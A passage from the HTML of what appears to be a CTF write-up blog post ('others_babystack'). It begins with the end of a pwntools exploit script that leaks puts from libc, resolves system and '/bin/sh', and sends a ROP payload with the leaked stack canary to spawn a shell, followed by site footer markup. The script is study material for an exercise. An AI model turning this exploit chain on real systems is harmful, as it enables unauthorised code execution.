class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;3&#x27;)</span><br><span class="line">p.recv()</span><br><span class="line">puts_addr=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x80+8)+p64(canary)+p64(0)</span><br><span class="line">payload+=p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/12/16/others-babystack/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/12/16/others-babystack/&text=others_babystack"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/12/16/others-babystack/&title=others_babystack"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/12/16/others-babystack/&is_video=false&description=others_babystack"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=others_babystack&body=Check out this article: http://example.com/2022/12/16/others-babystack/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/12/16/others-babystack/&title=others_babystack"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/12/16/others-babystack/&title=others_babystack"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/12/16/others-babystack/&title=others_babystack"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/12/16/others-babystack/&title=others_babystack"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/12/16/others-babystack/&name=others_babystack&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/12/16/others-babystack/&t=others_babystack"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
